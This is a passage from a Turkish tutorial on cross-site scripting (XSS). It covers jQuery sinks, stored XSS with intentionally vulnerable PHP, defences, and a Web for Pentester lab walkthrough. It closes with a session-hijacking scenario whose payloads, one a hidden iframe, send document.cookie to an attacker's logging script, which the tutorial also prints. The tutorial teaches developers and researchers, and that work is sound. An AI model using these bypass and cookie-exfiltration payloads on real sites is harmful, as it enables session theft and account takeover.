Bu zafiyetin birde jquery boyutu var tabi. JQueryde seçiciler(Selectors); bir html dökümanındaki etiketleri, idleri, classları seçmek için kullanılan bir yapıdır. Bunun bizi ilgilendiren tarafı ise; seçiciler ile seçtiğiniz bir id, class veya html etiketine bazı metotlar kullanarak dinamik bir şekilde ekleme yapabilmemizdir. Aşağıdaki listede kullanırken çok dikkat etmemiz gereken jquery metodları payloadlarıyla beraber verilmiştir.(sazan adlı bir id değerimizin olduğu varsayılmıştır.)
$('<script>alert(1);</script>').appendTo('#sazan');
$('<script>alert(1);</script>').prependTo('#sazan');
$('#sazan').after('<script>alert(1);</script>');
$('#sazan').before('<script>alert(1);</script>');
$('#sazan').prepend('<script>alert(1);</script>');```
$('#sazan').html('<script>alert(1);</script>');
$('#sazan').append('<script>alert(1);</script>');
Defalarca dedik yine diyelim; Kullanıcının müdahale edebileceği yerlere veya kullanıcıdan değer aldığınız yerlere çok ama çok dikkat ediniz!
Bu yapının da net anlaşılması adına diyagram üzerinde gösterelim.(Diyagramlar genelde konu başında verilir ama neden ben konu sonunda veriyorum bilmiyorum.)
 
1.	Saldırgan hedef sistemdeki dom-based xss zafiyetini kullanarak oturum bilgisini çalmak istediği kullanıcıya payloadı ile beraber linki gönderir.
2.	Kullanıcı(victim) bağlantıya tıklayıp zafiyetli siteye girer.
3.	Zafiyetli site kullanıcıya normal bir cevap döner ancak site; kendisini ziyaret eden kullanıcıların yaptığı sorguyu js ile ekrana yazmaktadır.
(Payload henüz execute edilmemiştir.)
4.	Zafiyetli siteden cevap döndükten sonra saldırganın sorgu parametresine yazdığı payload kurbanın tarayıcısı tarafından ifa edilir.
5.	Kurbanın oturum bilgileri saldırganın sunucusuna gönderilir.
Stored(Persistent) XSS
Kullanıcıdan alınan verinin yeterli filtrelemeden geçmemesi sonucunda veri tabanına kayıt edildikten sonra kayıt edilen bu veri başka bir yerde kullanılmak üzere veri tabanından çekileceği sırada ortaya çıkan bir xss zafiyet türüdür. Diğer türlerine oranla çok daha tehlikelidir. Çünkü bu xss zafiyet türünde zararlı kod veri tabanına kayıt edilir. Bu da şu anlama gelmektedir; Sisteme kayıtlı olan kullanıcılar zafiyetten etkilenen sayfayı ziyaret ettikleri anda oturum bilgilerini farkında olmadan saldırgana kaptırırlar. Tehlikeli olan nokta tam da burası işte. Saldırganın kimseyle muhattap olmaması... Diğer xss türlerinde saldırgan, kullanıcılara ilgili bağlantıya bir şekilde istek yaptırtmaya çalışır ama burada böyle bir durum söz konusu değildir. Payloadın kendisi sitenin veri tabanında kayıtlı zaten. Sadece payloadın select edileceği sayfayı kullanıcın ziyaret etmesi yeterli. Bu durumda sadece bir kişi veya bir grup değil sistemde kayıtlı olan herkes zafiyetten etkilenmiş olur. Diğer xss türlerinde fazla detaya girdiğimiz için bu türün teknik olarak diğerlerinden çok bir farkı bulunmamakta. Sadece bu sefer işin içinde veri tabanı girmektedir. Bu da saldırının kapsamını ve tehlikesini ciddi anlamda büyütmektedir.
Kullanıcıların yorum yaptığı bir sistem düşünelim. Ve back-end kısmında şöyle bir kod yazılmış olsun.
<?php #yorumlar.php sayfası. Kullanıcıların yorum yazması veya yazılan yorumları okuması için kodlandı. #veri tabanı bağlantısı ve seçimi vs. yapıldı...
$mesaj   = $_POST['mesaj'];
$user    = $_POST['user'];
$ekle    = mysql_query(INSERT INTO yorumlar (user, mesaj) VALUES('$user',
'$mesaj'));
$q = mysql_query(SELECT * FROM yorumlar); while($row = mysql_fetch_array($q)) { echo $row['user']." - ".$row['mesaj']; }
?>
Eminim yukarıdaki kodu yazacak junior developerlar bile yoktur artık. Ancak amacım basit bir örnek ile mantığını anlatmak olduğundan böyle bir kod yazdım. Yukarıdaki kodda mysql database ile işlem yaptık ama diğer databaselerde de yukarıdakine benzer fonksiyonlar ile işlem yaptırırsanız durum değişmeyecektir yine. İsterseniz php'deki oracle database ile işlem yapmak için kullanılan oci_* fonksiyonlarını kullanın bir şey değişmeyecektir. Bu gibi düz database işlemleri yaparsanız çok büyük ihtimmale zafiyet bırakırsınız ki php'de zaten artık bu fonksiyonları tavsiye etmiyor ve kullanıcılarının ya mysqli yada pdo kullanmaya zorluyor. Neyse konu fazla dağılmasın. Sonuç olarak kullanıcıdan gelen veriyi temizlemeden doğrudan sql sorgusuna sokulması hem sqli hemde xss zafiyetine sebeb olmaktadır. Yukarıda olan durumda tam olarak bu. Php için PDO sınıfını kullanırsanız filtrelemeler ile uğraşmanıza gerek kalmaz. PDO sınıfı, php ile veritabanı arasında güvenli bir şekilde veri alışverişi yapmak ve diğer veri tabanları desteği sayesinde oldukça kolaylık sağlamaktadır veya orm kullanabilirsiniz. Örnek senaryo bölümünde bu zafiyet türü kullanıldığı için gerekli detayı videoda izleyebilirsiniz.
XSS Zafiyetinin Çözümü
Şimdiye kadar hep bir saldırganın gözüyle sisteme baktık ama bu başlıkta bir devoloper olarak duruma yaklaşacağız ve geliştireceğimiz uygulamalarda xss zafiyeti bırakmamak için bazı ipuçları vereceğiz.
Girdi Kontrolleri
Zafiyete, kullanıcının müdahale edebildiği alanlar veya kullanıcıdan alınan veriler sebeb olduğu için çözümü de burada arayacağız. Girdi denetiminleri çok sıkı sıkıya yapıldığı taktirde bu zafiyet ortaya çıkmayacaktır. Şimdi bu denetimlerde kullanılan kabul görmüş çözüm tekniklerine göz atalım.
White List Tekniği
Pozitif girdi denetimi olarakta bilinen bu çözüm metodunda kullanıcıdan gelecek olan verilerin(karakterlerin, kelimelerin vs) hangilerine izin verileceği belirtilir. Örnek vermek gerekirse kullanıcıdan sadece alfanumeric değerler alıyor isek (yani A'dan Z'ye ve 0'dan 9'a) bunu regex ile ifade ederek sadece kabul edeceğimiz verileri belirleriz. Bu durumda kullanıcıdan gelecek olan özel karakterlerin bütününü kabul etmemiş oluruz. Başka bir örnek daha verecek olursak kullanıcıdan aldığımız değerler sadece belli kelimeler veya ifadelerden ibaret ise sadece kabul edebileceklerimizi belirler, belirlediğimiz değerler dışında gelen değerleri işleme almayız.
Black List Tekniği
Bu teknikte ise white list'in aksine kullanıcıdan gelen veriler arasında kabul etmediklerimizi belirleriz. White list gibi sağlam görünse de aslında hiç öyle değildir. Bu çözüm tekniğinde olasılıklar çok fazla ve bir tanesinin bile gözünüzden kaçması zafiyete sebeb olmaktadır. < , ' , > , " karakterlerini engellediğinizde bunların hex formatını da engelleyeceksiniz encode edilmiş hallini de engelleyeceksiniz yazılan koda göre değişiklik göstermekle beraber bazen bu karakterler kullanılmadan da zafiyet oluşabilmektedir. Bu durumda script kelimesini engellemelisiniz, alert, prompt, confirm, hex formatları, char formatları vs vs külfetten başka bir şey değil gördüğünüz gibi olasılıklar çok fazla çünkü.
Sanitize
Sanitize yönteminde kullanıcıdan gelen veri arıtılır/temizlenir. Kullanıcıdan gelen veriler arasında yasaklı karakterler(black list)/izin verilmeyen karakterler(white list) bulunmasına rağmen bunu işleme almamak yerine veri içerisindeki zararlı/istenmeyen karakterler veriden çıkarılarak verinin temizlendikten sonra işleme alınması yöntemidir. Bu çözüm yoluda geliştirdiğiniz uygulamadada xss zafiyeti bırakma olasılığınızı çok çok düşürmektedir.
Encoding
Gelen veri içerisindeki özel karakterlerin başka bir formata dönüştürülüp artık özel anlamını yitirmesi durumudur. Yukarıda dom-based xss türünde firefox tarayıcısının kullanıcılarını bu zafiyetten korumak için tam olarak yaptığı encoding işlemidir. Html ve url encoding web saldırılarından korunmak için en sık başvurulan kodlamalardandır. <, >, ', " gibi karakterleri encode işleminden geçirdiğinizde bazı web tabanlı saldırılarından(sqli, xss, code inj.) korunmak için kayda değer bir önlem almış olursunuz, ama tabiki tek başına bu çözüm yeterli değildir.
Geliştireceğiniz uygulamada yukarıda sunulan çözüm stratejilerinden birkaçını beraber kullanırsanız bu zafiyete mahal vermemiş olursunuz. Girdiyi birkaç aşamadan geçirdiğinizde güvenliği artırmış olursunuz. Yani önce white ve black list yöntemi ile girdiyi temizle sonra encoding uygula en sonunda veriyi işleme al.
Güvenlik camiasındaki şu meşhur sözü duymuşsunuzdur; En zayıf halkanız kadar güvendesinizdir. Güvenlik bir bütün olarak ele alınmalıdır. Sisteminizi parçalara ayırıp her parçanın güvenliğini ayrı ayrı sağladığınız takdir de parçaların oluşturduğu bütün güvenli sayılır. Aksi halde tek bir parçadan kaynaklanan zafiyet bütün sistemi riske atmaktadır.
Web for Pentester
Bu teorik bilgilerimizi uygulamayabilmek için bir pentest lab ortamı kuracağız. Bunun için bu linkte bulunan iso dosyasını indirip wmware veya virtual box gibi sanallaştırma yazılımlarını kullanarak çalıştıracağız. Ve bu sanal makinenin ip adresini kendi tarayıcımıza yazdığımızda aşağıdaki ekranla karşılaşırsak nema problema. Googledan web for pentester diye aratırsanız sayfalarca sonuç çıkacaktır.
 
Xss zafiyeti araken körü körüne random payloadlar yazmak yerine, ilgili parametreye doğrudan bütün özel karakterleri (<,',<,") yazıp hangilerinin filtrelendiğini görebiliriz, ve buna dayanarak daha makul ve yerinde payladlar yazarak zamandan tasaruf edebiliriz.
Şimdi XSS kategorisindeki caseleri çözmeye başlayalım.
Example 1
Url'de http://192.168.46.128/xss/example1.php?name= gördüğünüz üzere example1.php dosyası, get metodu ile name parametresine aldığı değeri ekrana basılıyor. Yukarıdaki trickte bahsettiğimiz gibi özel karakterlerimizi yazarak sayfanın kaynak kodunda oluşan değişimi gözlemleyip ona göre payload geliştirelim.
 
Gördüğünüz üzere en ufak bi filtreleme yok. Yazdığımız bütün karakterler ekrana yansıdı. İlk örnek olduğu için en temel xss payloadımız olan <script>alert(1)</script>yazalım.
 
Alerti başarılı bir şekilde aldık. Şimdi kaynak koduna bakıp 2. Örneğe geçelim.
 
Kaynak koddan gördüğünüz gibi kullanıcıdan gelen veri hiç süzülmeden doğrudan ekrana basılmaktadır. Bundan daha büyük hata olabilir mi?
Example 2
Url yapısı ilk casemiz ile aynı. Ancak ilk örnekte kullandığımız payloadı burda denediğimizde text olarak “Hello alert(1)” çıktısını alıyoruz.
 
Burda olan işlemden şu sonucu çıkarabiliriz; yazdığımız javascript kodu çalışmadı. Çünkü ekranda alert(1) ifadesi text olarak göründü bunun anlamı ise geliştirici script keywordunü filtrelemiş. Peki bunu nasıl bypass ederiz? En temel şekilde büyük-küçük yazarız.
Payloadımız: <ScRipt>alert(1)</sCriPT>
 
Kaynak kodu incelediğimizde, get metoduyla name parametresine verilen değer name değişkenine atanmıştır ve preg_replace() fonksiyonu sayesinde name değişkeninde eğer <script> veya </script> kelimeleri geçiyor ise bunları silmektedir/değiştirmektedir.
Example 3
Url adresimizdeki name parametresi dikkatimizi çekmiş olmalı. Özel karakterlerimizi kullanıp herhangi bir filtrelenme var mı diye kontrol edelim. Sayfanın kaynak koduna baktığımızda özel karakterlerimizin filtrelenmediğini görürüz. Ve sazan gibi en temel payloadımız olan <script>alert(1) </script> yazıyoruz. Hopaaa! Script keywordu engellenmiş :/
 
script keywordunu büyük-küçük yazmamıza rağmen işe yaramayacaktır. O zaman ne yapabiliriz?
Okumayı burda bırakıp biraz düşünün :)
Cevap, iç içe yazmak. Yani <scr<script>ipt>alert(1)</scr</script>ipt> . Bu payload arkada nasıl işleyecek peki? Name parametesine yazacağımız payloadlarda geçen <script> keywordlerini sileceği için geriye yine <script> keywordu kalacaktır. Ve payloadımız başarıyla çalışacaktır.
 
Yani uzun lafın kısası payloadımız: <scri<script>pt>alert(1)</scri</script>pt>
 
Kaynak kodu incelediğimizde gördüğümüz gibi script kelimesi temizleniyor.
Regex de /i ifadesi büyük-küçük harflere karşı duyarsızlığı ifade ediyor. Yani siz aLeRt veya alert de yazsanız farketmeyecek ikisinide engelleyecektir.
Example 4
Örnek4 de ise şimdiye kadar denediğimiz 3 payloadın bu örnekte çalışmadığını göreceğiz.
Payloadlarımızı yazıp html kaynak kodlarına baktığımızda aşağıda bulunan resimdeki gibi bir sonuç aldığımızı görüyoruz. Sayfanın kaynak koduna baktığımızda sadece “error” ibaresini göreceğiz. Büyük olasılıkla geliştirici name parametresine verilen değerde script veya alert gibi özel kelimeleri filtrelemiştir. Ve bu kelimeler kullanıldıldığı taktirde die() veya error() gibi fonksiyonlarla çalışan betiği sonlandırır. Bu noktada bizim yazacağımız kod bu kelime(ler)i içermeyen bir payload yazmaktır. Bunu da html taglarındaki attributleri kullanarak yapacağız. Yani bir html etiketinin atributtune js kodu yazacağız. Örneğin şöyle; <img src=x onerror=alert(1)> gördüğünüz üzere hiç script kelimesini kullanmadık. Bu payloadda src adında bir imaj yüklemeye çalıştık eğer yükleyemez, bir hata meydana gelir ise onerror attributune vereceğimiz alert ile ekrana 1 yazacak. Payloadımızı denediğimizde çalışacağını göreceğiz. Alternatif olarak <svg src=x onerror=alert(1)> çalışacaktır hatta benzer yapıya sahip başka html etiketleri de çalışacaktır.
 
Sayfanın kaynak koduna bakıldığında payloadımızın html syntaxına uygun olduğu görülecektir.
Bundan dolayı sorunsuz bir şekilde çalıştı. Yazacağımız bütün payloadlarda bunu dikkate almalıyız.
İlgili dilin syntaxına uygun olarak yazılacak ki payload çalışabilsin.
 
Şimdi kaynak kodu inceleyelim. Evet gördüğünüz gibi aynen düşündüğümüz gibi Regex ifadesi kullanılarak script kelimesinin name parametresine verilmesi durumunda die komutu ile sayfanın geri kalanını çalıştırmayacak şekilde error verdirilmiş.
Example 5
Artık tahmin edeceğiniz gibi bir sonraki örnekte şimdiye kadar denediğimiz hiçbir payload çalışmayacaktır. Normal bir payload yazdığımızda önceki örnekte olduğu gibi error ifadesini ekrana basıyor. Muhtemelen yine özel keywordlerden biri engellenmiştir. Şu ana kadar hep alert() ile ekrana birşeyler basmaya çalıştık ama tek kod bu değil. Benim bildiğim 2 komut daha var. Birincisi ekrana hem alert gibi pencere açıp aynı zamanda kullanıcıdan girdi alan prompt(), bir de kullanıcıdan onay isteyen confirm() kodu. Bunlar dışında başka popup boxlar da olabilir, benim bildiğim bu üçü. O zaman bu durumda payloadımız nasıl olacak?
<script>prompt(1)</script> veya <script>confirm(1)</script> her iki payload da sorunsuz çalışacaktır.
 
Ctrl+u ile sayfanın kaynak kodlarına bakalım. Aşağıda gördüğünüz üzere yazdığımız payload script tagleri arasında ilgili yere yazılmış. Burda önemli olan nokta yazdığımız payload javascript syntaxını bozmadan yazılmış olmasıdır. Zaten syntaxı bozarsanız payloadınız çalışmayacaktır. Bu nedenle xss ararken deneme amaçlı yazdığınız payloadları sayfanın kaynak kodundaki değişimlerden takip ederek daha isabetli atışlar yapabilirsinizi.
 
Şimdi php tarafındaki kaynak kodları görelim;
 
preg_match() fonksiyonunun yaptığı şudur; Eğer birinci parametredeki değer, ikinci parametredeki veri içerisinde geçiyor ise true döner, geçmiyor ise false döner. Bu örnekte ilk parametremiz alert kelimesi oluyor ve \i ifadesinden dolayı (harf duyarlılığı olmaksızın) alert kelimesinin, get metoduyla alınan name parametresindeki değer içerisinde geçmesi durumunda fonksiyonumuz true dönecektir.
Example 6
Öncellikle name parametresine “<’> şu 4 özel karakteri girelim bakalım ne olacak. Sayfanın kaynak kodundan anlaşılacağı üzere herhangi bir karakter filtrelenmesi söz konusu değil. Ctrl+u yaparak kaynak koda baktığımızda name parametresine girdiğimiz her değer script tagleri arasında bulunan a değişkenine atanıyor.
 
Bu durumda nasıl bir payload geliştirebiliriz? Düşünelim biraz… Öncellikle açılmış olan script tagini kapatalım. Daha sonra kendimiz bir script tagi açıp alert ile ekrana uyarıyı bastıktan sonra tagi kapatalım. Bazılarınız kapatmaya gerek yok zaten kendisi kapatmış diyebilir haklı olaraktan ancak sayfanın kaynak koduna baktığınızda “ ve ; işaretleri bize sorun oluşturacağından dolayı kendimiz kapatmamız gerekecektir. Uzun lafın kısası payloadımız;
</script><script>alert(1)</script> şeklinde olacaktır.
 
Bu örneğin kaynak koduna bakmaya gerek yok çünkü herhangi server side (php) tarafından bir filtreleme uygulanmamıştır. Sadece js kullanılmıştır. Sayfanın kaynak koduna bakıp ne tür bir filtreleme yapıldığını görebilirsiniz.
Example7
Sıra geldi 7. Örneğimize bu örnek extrem bir örnek olabilir. Bu örneğimizde diğerlerinden farklı olarak önce kaynak koduna bakıp ona göre payload geliştireceğiz. Bu noktada; E biz nerden bilelim sitenin kaynak kodlarını diyebilirsiniz? (Demeyin!) Şöyle bir durum var. Bir çok açık kaynak template, hazır scriptler, cms ler var. Eğer hedefimiz bu public olan bir sistem/script kullanıyorsa o zaman kaynak kodlarını indirip inceleyip ona göre payload geliştirebilirsiniz. Durum böyle olduğu için sadece tek bir sitede değil ilgili scripti kullanan her sitede payloadınız çalışacaktır.
 
Php de güvenlik adına çok önemli olan fonksiyonlardan biri de htmlentities() fonksiyonudur. Bu fonksiyon kendisine verilen her değerin içinde bulunan (<, ", >) ifadelerini sırasıyla (&lt; , &quot; , &gt;) ifadelerine dönüştürür. Hatta 2. parametre olarak ENT_QUOTES değerini verirseniz ‘ (tek tırnağı da) engellemiş olursunuz. Tek tırnak ise &#039; formatına dönüşür. Yani htmlentities($str, ENT_QUOTES) şeklinde kullanırsanız (<, ', ", >) bu 4 karakteri encoding ettiğinizden artık özel anlamlarını yitireceğinden bu karakterleri barındıran zararlı kodlar çalışmayacaktır. Bu saldırganın işini çok ama çok zorlaştırır. XSS ile veri aldığımız inputlardaki değeri bu fonksiyondan geçirirsek çok büyük bir olasılıkla xss saldırısından korunmuş olacağız. Bu nedenle bu fonksiyon geliştiriciler için bi’ nimettir. Ancak bazı nadir vardır ki bu fonksiyon kullanılmasına rağman xss zaafiyeti meydana yine meydana gelmektedir. Sıradaki örneğimizde işte bu nadir olan durumlardan birini göreceğiz.
Şimdi bu kadar bilgiyi neden paylaştım? Çünkü sıradaki challangemızda inputtan alınan değer bu fonksiyondan geçmiştir. Ancak tek tırnağı da engellemek için opsiyonel olarak 2. Parametre de alabileceğini söylemiştik bu challangemızda 2. Parametre belirtilmemiştir. Bu da şu anlama gelmektedir; ‘ tırnak kullanabiliriz. Ve bir çok geliştirici bu fonksiyonu kullandığı zaman 2.
Parametreyi belirtmez bu da saldırganın işini çok kolaylaştırmaktadır. Asıl mevzumuza gelelim şimdi. Name parametresine özel karakterlerimizi girip sayfanın kaynak koduna bakıp meydana gelen değişimi gözlemleyelim.
 
Gördüğünüz gibi sırasıyla < , > , “ karakterlerimiz; &alt; , &gt; , &quot; karakterlerine dönüştürülerek güvenlik sağlanmaya çalışılmış AMA dikkat ettiyseniz ‘(tek tırnak) karakteri olduğu gibi kaldı. Bu bizim için çok önemli! Bir diğer önemli olan nokta ise; name parametresine yazdığımız değerin zaten <script> tagleri arasında işlenecek olmasıdır. Böylelikle <, > karakterlerini kullanmamıza gerek kalmayacak. Öte yandan sayfanın kaynak koduna baktığımızda yazdığımız değerin JS kısmında a diye bir değişkende ‘(tek tırnaklar) arasında tutulduğunu göreceğiz. Şimdi şöyle düşünelim ekrana alert vermek için öncellikle js tarafında olan a değişkeninin alacağı değerin ‘ işaretini kapatalım. Daha sonra ;(noktalı virgül) karakterimizi yazarak ilgili kod satırını sonlandıralım. Şimdi alert ifademizi yazabiliriz. Zaten JS kodunda önceden var olan sondaki ‘ işaretinden kaçmak içinde // karakterlerini kullanarak pasif ediyor. Yani şöyle bir şey oldu; Payload:musana’;alert(1)//
 
Zaten payloadımızı js de ilgili yere yazdığımızda herhangi bir syntax hatasının olmadığını göreceğiz.
 
Bir sonraki örneğimizde bizi bir input karşılıyor ancak bizim input ile işimiz olmayacak. Sayfanın kaynak kodlarına baktığımızda form etikemizin action niteliğinde sayfamızın olduğunu göreceğiz. Bu nedenle sayfamızın url yapısını mıncıklayacağız biraz. Çünkü url kısmına ne yazılır ise form etiketnin action niteliğinin değeri olarak atanıyor. O halde aşağıdaki payload çalışacaktır.
/" onmouseover="alert(1)
/” ile action niteliğimizin değerini kapadık. Daha sonra onmouseover adında bir js eventı tanımladık ancak payloadın sonuna “(çift tırnak) atmadık çünkü tırnağı kendisi tamamlayacak.
 
Kaynak koda baktığımızda payloadımızın cuk diye oturduğunu görüyoruz zaten. Aşağıdaki resimde ise php kaynak kodlarını görüyoruz. Htmlentities fonksiyonu kullanılarak input’tan gelen zararlı karakterler filtrelenmiş. Ancak form etiketinin action niteliğinde PHP_SELF kullanılmış. Yani formdan gönderilecek herhangi bir very aynı sayfada işlenecek. Bizde tam olarak bu kısmı kullanarak payload geliştirdik.
 
BONUS(Siz Çözün):
Şimdiye kadar gördüğümüz örnek caselere dayanarak bu örneği çözmenizi bekliyorum. Çünkü yukarıdakileri okuyup anladıysanız biraz kafa yorarak rahatlıkla zafiyeti ortaya çıkaracak payloadı yazabilirsiniz. Payloadları yorum kısmına bekliyorum :)
<?php
$request    = $_REQUEST['istek'];
$filtrele   = array('<', '>', '"');
# htmlentities() fonksiyonunun default kullanımı # 3. ve 4. satırdaki işlemleri icra eder.
$request    = str_replace($filtrele, "", $request);
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>XSS</title>
</head>
<body>     <script>         var value;         function setValue(){             if(false){                 value = <?php echo $request ?>             }
        }
    </script>
</body>
</html>
Örnek bir senaryo
Şimdiye kadar gördülerimiz ile bir sistemde olan xss zafiyetini ortaya çıkarmak için ne tür/nasıl payloadlar geliştireceğimizi gördük. Peki iyi güzel de bir sitede xss zafiyetinin olması neyi ifade ediyor tam anlamıyla? Neden bu kadar tehlikeli? Bug bounty programlarında neden para veriliyor bu zafiyete? Saldırganlar bu zafiyeti nasıl istismar ediyor? Şimdi bu sorulara uygulamalı cevap verme zamanı. Örnek bir site üzerinde bulacağımız bir xss zafiyeti ile kullanıcın oturum bilgilerinin nasıl ele geçirileceğini göreceğiz.
Oracle ve php ile CRUD(Create, Read, Update, Delete) işlemlerini yapan basit bir web uygulaması yazmıştım zamanında örnek senaryamozu bu uygulama üzerinde anlatacağım. Scripti buradan indirebilirsiniz. (Scriptin çalışması için oracle express edition programını kurmanız gerekmektedir.)
Burdan sonrasını video ile anlatmak daha iyi olacak sanırım. Yazı zaten yeterince uzun ne siz sıkılın ne ben yorulayım :)
Videoda herşeyi açık bir şekilde göstermeye çalıştım. Aklınıza takılan bir yer olursa veya scripti çalıştırmada sorun yaşarsanız yorum bölümüne yazmanız yeterli.
Video Bağlantısı:
SESSION HIJACKING USING XSS - MUSANA.NET
Videoda tam olarak ne yaptığımı açık bir şekilde yazmaya çalıştım. Kullandığım kodları paylaşıp kısa bir özet geçtikten bu bölümü sonlandıracağım.
Öncellikle hedef sistemin kayıt ol sisteminde stored xss zafiyeti bulduk ve istismar etmek için kayıt ol inputlarından birine aşağıdaki payloadı yazdık. Payloadımız veri tabanına kayıt edildiği için giriş yapan herkes oturum bilgileri ile beraber bizim istediğimiz adrese yönlendirilecekti.
<script>location.href="http://127.0.0.1/session_log/snif.php?x="+document_cookie+"\ n"</script>
snif.php dosyamızı da paylaşalım. Sadece gelen x parametresindeki değeri log.txt dosyasına yazıyor, that's that.
<?php $cookie = $_GET['x']; // get metoduyla x parametresinin değerini cookie değişkenine atatık.
$f = fopen("log.txt","a"); // log.txt adında bir metin belgesini a izniyle açtık. a: yoksa oluştur, varsa sonuna ekle.
fwrite($f, $cookie."\n"); // log.txt dosyamıza cookie değerlerini yazıyoruz. fclose($f); // Dosyamızı kapattık. ?>
Ancak sisteme giriş yapan herkes yönlendirildiği için bu durumun çok anormal olduklarını farkedeceklerdi. Kullanıcılara sezdirmeden yapabilmek için farklı bir payload kullandık.
Kullandığımız paylaad; src niteliği saldırganın kullandığı sunucunun adresi olan bir iframe penceresi oluşturuyordu ve style olarak verdiğimiz display:none değeri sayesinde bu iframe sayfada hiçbir şekilde görünmüyordu. Kullanıcıların gözünde herşey normaldi ancak sisteme giriş yapan herkes src niteliğindeki bağlantıya oturum bilgileri ile beraber request gönderiyordu.(Scriptte jquery kütüphanesinin kullanıldığını hatırlatmakta fayda var. jquery kullanılmasaydı aşağıdaki payload çalışmayacaktı. Sadece js kullanılarak da aynı işlem yapılabilir.)
<iframe id="ifrm" src="x" style="display:none"></iframe>
<script>$(document).ready(function() {
$("#ifrm").attr("src",
("http://127.0.0.1/session_log/snif.php?x="+document.cookie));
});
</script>
Böylece sisteme giriş yapan bütün kullanıcıların oturum bilgilerini elde etmiş olduk. Büyük bir sitede böyle bir zafiyet bulduğunuzu düşünsenize ?
SON SÖZ
Bu yazıda elimden geldiği kadar konuyu temelden alarak anlatmaya çalıştım. Amacım, xss konusunda bu yazıyı okuyanları belli bir seviyeye getirmektir. Bir geliştiricinin kodlayacağı sistemde böyle bir zafiyet bırakmaması için gerekli önlemleri almasını veya bir güvenlik araştırmacısının ezbersiz bir şekilde payload geliştirebilecek bir seviyeye gelmesini hedefledim. Bu yazıyı okuduktan sonra sakın xss zafiyetini tam öğrendim hissine kapılmayın! Bu konu çok geniş ve sürekli güncel tutulması gerekir. Bu zafiyeti istismar etmek için birçok metod ve binlerce xss payloadı mevcut. Ben sadece zafiyetin mantalitesini anlatıp birkaç case ve bir örnek senaryo ile pekiştirmeye çalıştım.
Faydası dokunduysa sizlere ne mutlu bana.
Google'da xss zafiyetinin ne kadar tehlikeli olduğunu bildiğinden eğitici bir challenge hazırlamış. Belki uğraşmak isteyabilirsiniz. Ayrıca Black Hat Asia '15 konferansında sunulan dom based xss ile ilgili pdf dökümümanını da buradan incelemek isteyebilirsiniz.
Bu arada yazıda gördüğünüz eksiklikleri, hatalı bilgileri veya yazım yanlışlarını bildirirseniz minnettar kalırım.
Güvenlik konusu sizde bilirsiniz ki sürekli güncel tutulması gerekilen bir konudur. Var olan zafiyetlere yeni teknikler eklenmenin yanında yeni zafiyet türleride geliştirilmektedir/bulunmaktadır. Bu nedenle kendinizi bu konularda güncel tutmanız ve motivasyonunuzu kaybetmememiz temennisiyle. Sağlıcakla kalınız.

 
 
 
 
 
 
 
 
 
 
 

 
 
 
